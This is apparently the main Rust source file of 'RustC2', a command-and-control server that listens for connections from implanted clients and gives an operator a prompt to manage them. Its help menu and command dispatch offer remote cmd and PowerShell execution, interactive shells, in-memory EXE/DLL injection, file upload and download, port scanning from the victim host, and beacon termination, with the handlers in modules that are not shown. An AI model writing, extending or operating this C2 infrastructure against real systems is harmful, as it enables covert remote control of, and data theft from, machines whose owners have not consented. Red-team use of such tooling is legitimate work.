mod utils;
mod locals;
mod spawn;
use clap::{Command, arg};

use std::collections::HashMap;
use std::io::Write;
use std::sync::Arc;
use std::thread;

use rustyline::DefaultEditor;

use tokio::runtime::Runtime;
use tokio::sync::Mutex;
use tokio::net::{TcpListener, TcpStream};
use utils::ConnectionInfo;

fn print_help() -> String {
    let mut output = "\nC2 made in Rust\nAvailable commands in C2 prompt:\n\n".to_string();
    output.push_str("  <args> are required, [args] are optional\n");
    output.push_str("  help                  Show this menu\n");
    output.push_str("  shell <cmd>           Run a local shell command\n");
    output.push_str("  connection <raw|client> Switches between a raw or c2 client connection\n");
    output.push_str("       Client connection by default, toggles when run with no arguments.\n");
    output.push_str("\n  ------------------------------------------------------------- \n");
    output.push_str("  Commands available when client is connected\n");
    output.push_str("  ------------------------------------------------------------- \n\n");
    output.push_str("  list                      List active connections\n");
    output.push_str("  cmd <ID> <command>        Send a cmd command to a host\n");
    output.push_str("  psh <ID> <command>        Send a PowerShell command to a host\n");
    output.push_str("  spawn <id>                Start an interactive shell\n\n");
    output.push_str("  import-psh <ID> <file>    Import a PowerShell script into the client\n");
    output.push_str("  run-psh <ID> <Function>   Run a function from the imported scripts\n\n");
    output.push_str("  inject <ID> <Path> <args> Execute an EXE/DLL in memory\n\n");

    output.push_str("  upload <ID> <file> <dest>        Upload a file to a host\n");
    output.push_str("  download <ID> <file> <dest>      Download a file from a host\n");
    output.push_str("  portscan <ID> <IP> <NUM1> <NUM2> Port scan a host\n");
    output.push_str("  kill <ID>                        Kills the beacon on the host\n");
    output.push_str("  exit                             Close all connections and exit(ctrl+d)\n\n");
    output
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new("RustC2")
    .version("0.1.0")
    .about(print_help())
    .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
    .get_matches();

    let mut port = "8080";
    if let Some(p) = matches.get_one::<String>("port") {
        port = p;
    }

    let active_connections: Arc<Mutex<HashMap<String, ConnectionInfo>>> = Arc::new(Mutex::new(HashMap::new()));
    let active_connections_clone = active_connections.clone();
    let raw_connection = Arc::new(Mutex::new(false));
    let raw_connection_clone = raw_connection.clone();

    println!("{}",format!("Listening for incoming connections on port {} in background", port));
    // user interactive commands thread
    thread::spawn(move || {
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            let mut rl = DefaultEditor::new().unwrap();
            let prompt = format!("{}", "RustC2> ");
            loop {
                std::io::stdout().flush().unwrap();
                let command = rl.readline(&prompt);
                match command {
                    Ok(command) => {
                        rl.add_history_entry(command.as_str()).unwrap();

                        if command.starts_with("help") {
                            println!("{}",print_help())
                        } else if command.starts_with("shell ") {
                            locals::spawn_shell(command);
                        } else if command.starts_with("connection") {
                            let mut raw_connection_lock = raw_connection_clone.lock().await;
                            if command.contains("raw") {
                                *raw_connection_lock = true;
                            } else if command.contains("client") {
                                *raw_connection_lock = false;
                            } else {
                                *raw_connection_lock = !*raw_connection_lock;
                            }
                            println!("Listener is now {}.", if *raw_connection_lock { "raw" } else { "client" });
                        } else if command.starts_with("list") {
                            let output = utils::handle_list(&active_connections_clone).await;
                            for con in &output {
                                println!("{}", con);
                            }
                        } else if command.starts_with("cmd") || command.starts_with("psh") {
                            let output = utils::handle_command(&active_connections_clone, &command, *raw_connection_clone.lock().await);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("spawn ") {
                            let output = spawn::handle_spawn(&active_connections_clone, &command, *raw_connection_clone.lock().await);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("import-psh") {
                            let output = utils::handle_importpsh(&active_connections_clone, &command);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("run-psh") {
                            let output = utils::handle_run_script(&active_connections_clone, &command);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("inject") {
                            let output = utils::handle_in_memory(&active_connections_clone, &command);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("upload") {
                            let output = utils::handle_upload(&active_connections_clone, &command, *raw_connection_clone.lock().await);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("download") {
                            let output = utils::handle_download(&active_connections_clone, &command, *raw_connection_clone.lock().await);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("kill") {
                            let output = utils::handle_kill(&active_connections_clone, &command, *raw_connection_clone.lock().await);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("portscan") {
                            let output = utils::handle_port_scan(&active_connections_clone, &command, *raw_connection_clone.lock().await);
                            match output.await {
                                Ok(output) => {
                                    println!("{}", output);
                                }
                                Err(e) => {
                                    println!("Error: {}", e);
                                }
                            }
                        } else if command.starts_with("exit") {
                            utils::handle_exit()
                        } else if command == "\n" || command == "" {
                            continue;
                        } else {
                            println!("type `help` to get usage information.")
                        }
                    },
                    Err(rustyline::error::ReadlineError::Interrupted) => {
                        print!("\r{}", format!("{}", "RustC2> "));
                        std::io::stdout().flush().unwrap();
                    },
                    Err(rustyline::error::ReadlineError::Eof) => {
                        utils::handle_exit()
                    },
                    Err(_) => {
                        println!("Error reading command")
                    }
                }
            }
        })
    });

    // listener and connection handler functionality
    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await
    .expect(format!("Failed to bind to port {}!", port).as_str());
    
    while let Ok((stream, sockaddr)) = listener.accept().await {
        let active_connections_clone = Arc::clone(&active_connections);
        let hostname = sockaddr.to_string();

        tokio::spawn(handle_connection(active_connections_clone, hostname, stream));
    }

    Ok(())
}

pub async fn handle_connection(
    active_connections: Arc<Mutex<HashMap<String,ConnectionInfo>>>,
    hostname: String,
    stream: TcpStream) {
    println!("{}", "\n[+] Connection recieved!");
    let mut stream = Arc::new(Mutex::new(stream));
    let hostname_clone = hostname.clone();
    
    let (username, os, shared_secret) = utils::parse_client_info(&mut stream).await;
    println!("username: {}, os: {}", username, os);
    let id = {
        let mut active_connections_lock = active_connections.lock().await;
            
        let id = match active_connections_lock.get(&hostname) {
            Some(info) => info.id,
            None => {
                let mut id = 0;
                while active_connections_lock.values().any(|info| info.id == id) {
                    id += 1;
                }
                active_connections_lock.insert(
                    hostname.clone(),
                    ConnectionInfo {
                        id,
                        stream: stream.clone(),
                        hostname: hostname.clone(),
                        is_pivot: false,
                        username: "".to_string(),
                        os: "".to_string(),
                        shared_secret: *shared_secret.as_bytes(),
                    },
                );
                id
            }
        };  
        id
    };

    {
        let mut active_connections_lock = active_connections.lock().await;
        active_connections_lock.insert(
            hostname.clone(),
            ConnectionInfo {
                id,
                stream: stream.clone(),
                hostname: hostname.clone(),
                is_pivot: false,
                username: username.to_string(),
                os: os.to_string(),
                shared_secret: *shared_secret.as_bytes(),
            },
        );
    }

    let active_connections_clone = Arc::clone(&active_connections);

    // heartbeat check task for each connection
    tokio::spawn(async move {
        let data = [0; 1];
        let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(60));
        loop {
            let _ = interval.tick().await;
            match stream.lock().await.try_write(&data) {
                Ok(_) => {}
                Err(_) => {
                    let mut active_connections_lock = active_connections_clone.lock().await;
                    let id = active_connections_lock.get_key_value(&hostname).unwrap().1.id;
                    println!("{}", format!("\nClient {} disconnected (ID {})\n", hostname, id));
                    print!("{}", format!("RustC2> "));
                    std::io::stdout().flush().unwrap();
                    active_connections_lock.remove(&hostname);
                    break;
                }
            }
        }
    });

    let id = active_connections.lock().await.get(&hostname_clone).unwrap().id;
    println!("{}",format!("[+] New client connected: {} (ID {})\n", hostname_clone, id));
    print!("{}", format!("RustC2> "));
    std::io::stdout().flush().unwrap();
}